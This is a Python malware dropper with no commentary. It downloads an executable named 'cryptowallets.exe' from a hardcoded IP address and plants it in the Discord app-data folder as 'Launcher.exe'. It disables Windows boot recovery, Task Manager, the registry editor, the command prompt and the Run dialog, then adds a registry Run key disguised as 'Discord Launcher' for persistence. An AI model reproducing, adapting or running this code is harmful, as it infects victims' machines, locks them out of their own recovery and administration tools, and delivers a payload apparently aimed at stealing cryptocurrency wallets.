import os
import requests

file_name = "Launcher.exe"

URL = "http://45.56.115.91:8000/cryptowallets.exe"

r = requests.get(URL, allow_redirects=True)

startup = os.path.expandvars(
    f'%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{file_name}')

discord = os.path.expandvars(f'%APPDATA%\\discord\\')


if os.path.exists(discord):
    open(discord + file_name, "wb").write(r.content)
else:
    os.makedirs(discord)
    open(discord + file_name, "wb").write(r.content)



try:
    os.system('bcdedit /set {default} recoveryenabled No')
    os.system('bcdedit /set {default} bootstatuspolicy ignoreallfailures')
    os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableRegistryTools /d 1 /f')
    os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableTaskMgr /d 1 /f')
    os.system(
        'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableCMD /d 1 /f')
    os.system(
        'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoRun /d 1 /f')
except:
    pass

try: 
    os.system(
        f'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /v "Discord Launcher" /d {discord+file_name} ')
except:
    pass